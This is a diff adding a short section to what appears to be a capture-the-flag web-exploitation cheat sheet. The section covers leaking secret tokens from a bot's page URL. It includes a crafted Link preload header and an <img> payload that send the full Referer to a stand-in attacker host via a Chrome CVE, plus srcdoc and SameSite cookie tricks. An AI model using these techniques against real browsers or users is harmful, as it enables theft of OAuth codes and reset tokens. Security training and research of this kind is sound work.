@@ -80,6 +80,14 @@ Patterns:
 - XSSI / JSONP callback exfiltration
 - hidden DOM or off-screen content harvesting
 
+### Leaking a secret in the page URL (no script needed)
+
+When a bot opens a URL containing a secret (OAuth `code`, reset token, query/fragment id) and you only control a sub-resource or sanitized `<img>`:
+- Chrome `Link` referer leak (CVE-2025-4664, builds < 136.0.7103.113): the attacker sub-resource responds `Link: <//attacker/leak>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` → Chrome preloads with the **full Referer including query**. Only `<img src=//attacker/x>` is required on the victim page.
+- `baseURI`/`srcdoc` inheritance: a sandboxed `srcdoc` reads the embedder's full URL; older Chrome leaks it cross-origin via session-history confusion (Chromium 41487933). Needs the victim framable.
+- Cookie context decides the delivery: `SameSite=Lax`/unset cookies ride only **top-level** navigations/popups, never cross-site iframes or sub-resources — so make the bot mint the secret via top-level navigation, then read the resulting URL.
+- These browser bugs are build-specific: pin the version from the Dockerfile, extract it, and reproduce locally with `--host-resolver-rules`/`--disable-popup-blocking` before firing.
+
 ## Node and prototype pollution
 
 If the target is Node-based, audit merge and nest libraries before chasing classic XSS.
